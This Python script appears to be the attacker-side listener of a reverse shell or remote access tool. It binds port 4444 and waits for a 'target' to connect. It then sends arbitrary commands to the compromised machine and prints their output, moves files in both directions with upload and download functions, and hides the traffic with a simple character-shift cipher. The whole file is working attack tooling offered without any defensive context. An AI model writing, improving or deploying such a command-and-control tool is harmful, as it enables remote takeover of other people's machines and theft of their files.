import socket

header_size = 10
ip = input(">> ")
port = 4444

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.bind((ip, port))
listener.listen(1)
print("[*]Waiting fo connectio")
target, address = listener.accept()
print(f"[*]Connection established with {address}")

key = 1000
encrypt = lambda text : ''.join(list(map(chr, [x + key for x in map(ord, text)])))
decrypt = lambda text : ''.join(list(map(chr, [x - key for x in map(ord, text)])))

def send(text):

    target.send(bytes(f"{len(text):<{header_size}}{encrypt(text)}", "utf-8"))

def receive():

    new_text = True
    full_text = ''

    while ( True ):

        text = target.recv(1024).decode("utf-8")

        if ( new_text ):

            text_size = int(text[:header_size])
            new_text = False

        full_text += text

        if ( len(full_text) - header_size == text_size ):

            return decrypt(full_text[header_size:])

def upload_file(command):

    try:
        file_content = open(command.split()[1], 'r').read()
        send(command)
        send(file_content)
    except:
        print("there is no such file")

def download_file(command):

    send(command)

    x = receive()

    if ( x == '0' ):
        print("file doesnt exist")
    else:
        f = open(command.split()[1], 'w').write(x)

command_dict = {"upload_file" : upload_file, "download_file" : download_file}

while ( True ):

    command = input(">> ")
    if ( not command ):
        continue

    elif (command.split()[0] in command_dict):
        for x in command_dict:
            if (command.split()[0] == x ):
                command_dict[x](command)

    else:
        send(command)
        print(receive())
